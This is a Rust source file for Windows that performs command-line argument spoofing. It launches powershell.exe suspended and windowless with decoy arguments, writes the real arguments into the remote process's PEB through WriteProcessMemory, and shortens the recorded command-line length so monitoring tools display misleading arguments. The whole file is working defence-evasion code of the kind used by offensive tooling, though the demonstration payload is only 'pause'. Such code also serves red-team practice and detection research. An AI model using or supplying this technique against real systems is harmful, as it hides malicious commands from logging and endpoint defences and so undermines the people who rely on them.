mod peb_structs;

use std::{
    ffi::{CString, OsStr}, mem::{offset_of, zeroed}, os::windows::ffi::OsStrExt, ptr::{null, null_mut}
};

use winapi::{
    ctypes::c_void,
    shared::{
        minwindef::{PULONG, ULONG},
        ntdef::{NTSTATUS, PVOID, UNICODE_STRING},
    },
    um::{
        errhandlingapi::GetLastError,
        handleapi::CloseHandle,
        heapapi::{GetProcessHeap, HeapAlloc, HeapFree},
        libloaderapi::{GetModuleHandleA, GetProcAddress},
        memoryapi::{ReadProcessMemory, WriteProcessMemory},
        processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA},
        winbase::{CREATE_NO_WINDOW, CREATE_SUSPENDED},
    },
};

use crate::peb_structs::{PEB, PROCESS_BASIC_INFORMATION, RTL_USER_PROCESS_PARAMETERS};

pub type PROCESSINFOCLASS = u32;

#[allow(non_camel_case_types)]
type fnNtQueryInformationProcess = unsafe extern "system" fn(
    process_handle: *mut c_void,
    process_information_class: PROCESSINFOCLASS,
    process_information: PVOID,
    process_information_length: ULONG,
    return_length: PULONG,
) -> NTSTATUS;

fn read_process_memory(
    h_process: *mut c_void,
    paddress: *mut c_void,
    buffer: &mut *mut c_void,
    size: usize,
) -> bool {
    unsafe {
        let mut bytes_read: usize = 0;

        *buffer = HeapAlloc(GetProcessHeap(), 0, size);

        if ReadProcessMemory(h_process, paddress, *buffer, size, &mut bytes_read) == 0 {
            println!(
                "[-] ReadProcessMemory failed with error: {}",
                GetLastError()
            );
            return false;
        }
    }
    return true;
}
#[allow(dead_code)]
fn write_process_memory(
    h_process: *mut c_void,
    paddress: *mut c_void,
    buffer: &mut *mut c_void,
    size: usize,
) -> bool {
    unsafe {
        let mut bytes_written: usize = 0;

        if WriteProcessMemory(h_process, paddress, *buffer, size, &mut bytes_written) == 0
            && bytes_written != size
        {
            println!(
                "[-] WriteProcessMemory failed with error: {}",
                GetLastError()
            );
            return false;
        }
    }

    return true;
}

#[allow(unused, useless_ptr_null_checks)]
fn spoof_args(
    dummy_args: &str,
    org_args: &str,
    pid: &mut u32,
    h_process: &mut *mut c_void,
    h_thread: &mut *mut c_void,
) -> bool {
    unsafe {
        let h_ndtll = GetModuleHandleA("ntdll\0".as_ptr() as *const i8);

        let nt_query_information_process: fnNtQueryInformationProcess =
            std::mem::transmute(GetProcAddress(
                h_ndtll,
                b"NtQueryInformationProcess\0".as_ptr() as *const i8,
            ));

        if nt_query_information_process as *const c_void == null() {
            println!("[-] Failed to get address of NtQueryInformationProcess");
            return false;
        }

        let mut si = zeroed::<STARTUPINFOA>();
        let mut pi = zeroed::<PROCESS_INFORMATION>();

        si.cb = size_of::<STARTUPINFOA>() as u32;

        let mut process_name = CString::new(dummy_args).unwrap();

        if CreateProcessA(
            null_mut(),
            process_name.as_ptr() as *mut i8,
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            null_mut(),
            "C:\\Windows\\System32\0".as_ptr() as *const i8,
            &mut si,
            &mut pi,
        ) == 0
        {
            println!(
                "[-] Failed to create process with error: {}",
                GetLastError()
            );
            return false;
        }

        let mut pbi: PROCESS_BASIC_INFORMATION = zeroed();
        let mut return_len: ULONG = 0;
        let status = nt_query_information_process(
            pi.hProcess,
            0,
            &mut pbi as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_len,
        );

        if status != 0 {
            println!(
                "[-] NtQueryInformationProcess failed with status: {}",
                status
            );
            return false;
        }

        let peb_size = size_of::<PEB>();
        let mut peb_buffer: *mut c_void = null_mut();

        if !read_process_memory(
            pi.hProcess,
            pbi.PebBaseAddress as *mut c_void,
            &mut peb_buffer,
            peb_size,
        ) {
            println!("[-] Failed to read PEB");
            return false;
        }

        let peb = &*(peb_buffer as *const PEB);
        let param_size = size_of::<RTL_USER_PROCESS_PARAMETERS>() + 0xFF;
        let mut param_buffer: *mut c_void = null_mut();

        if !read_process_memory(
            pi.hProcess,
            peb.ProcessParameters as *mut c_void,
            &mut param_buffer,
            param_size,
        ) {
            println!("[-] Failed to read process parameters");
            return false;
        }

        let params = &*(param_buffer as *const RTL_USER_PROCESS_PARAMETERS);
        let cmd_line = if !params.CommandLine.Buffer.is_null() && params.CommandLine.Length > 0 {
            let cmd_len = (params.CommandLine.Length as usize / 2) + 1;
            let mut cmd_buffer: *mut c_void = null_mut();

            if read_process_memory(
                pi.hProcess,
                params.CommandLine.Buffer as *mut c_void,
                &mut cmd_buffer,
                params.CommandLine.Length as usize,
            ) {
                let wide_str = std::slice::from_raw_parts(
                    cmd_buffer as *const u16,
                    params.CommandLine.Length as usize / 2,
                );
                String::from_utf16_lossy(wide_str).to_string()
            } else {
                "Failed to read command line from remote process".to_string()
            }
        } else {
            "Invalid UTF-16".to_string()
        };
        println!("[+] Original Command Line: {}", cmd_line);

        // pause();

        let mut wide_args: Vec<u16> = OsStr::new(org_args).encode_wide().chain(std::iter::once(0)).collect();
        let buffer_size = wide_args.len() * size_of::<u16>();

        println!("[*] Writing original args: {}", org_args);

        let mut buffer_ptr = wide_args.as_mut_ptr() as *mut c_void;
        if write_process_memory(
            pi.hProcess,
            params.CommandLine.Buffer as *mut c_void,
            &mut buffer_ptr,
            buffer_size,
        ) {
            println!("[+] Successfully wrote original args to remote process");
        } else {
            println!("[-] Failed to write original args to remote process");
            return false;
        }

        let mut new_len: u16 = "powershell.exe".len() as u16 * 2; // size in bytes
        let length_offset = offset_of!(RTL_USER_PROCESS_PARAMETERS, CommandLine) + offset_of!(UNICODE_STRING, Length);
        let length_address = ((*peb).ProcessParameters as *mut u8).add(length_offset) as PVOID;    

        println!(
            "[i] Updating The Length Of The Process Argument From {} To {} ...",
            params.CommandLine.Length,
            new_len
        );

        let mut new_len_ptr = &mut new_len as *mut u16 as *mut c_void;
        write_process_memory(pi.hProcess, length_address, &mut new_len_ptr, size_of::<u16>());


        HeapFree(GetProcessHeap(), 0, peb_buffer);
        HeapFree(GetProcessHeap(), 0, param_buffer);

        // pause();

        ResumeThread(pi.hThread);

        *pid = pi.dwProcessId;
        *h_process = pi.hProcess;
        *h_thread = pi.hThread;
    }

    return true;
}

#[allow(dead_code)]
fn pause() {
    println!("[*] Press Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

fn main() {
    let mut pid: u32 = 0;
    let mut h_process: *mut c_void = null_mut();
    let mut h_thread: *mut c_void = null_mut();

    spoof_args(
        "powershell.exe Dummy Args.",
        "powershell.exe -c pause",
        &mut pid,
        &mut h_process,
        &mut h_thread,
    );


    println!("[+] Created process with PID: {}", pid);

    unsafe {
        CloseHandle(h_process);
        CloseHandle(h_thread);
    }
}
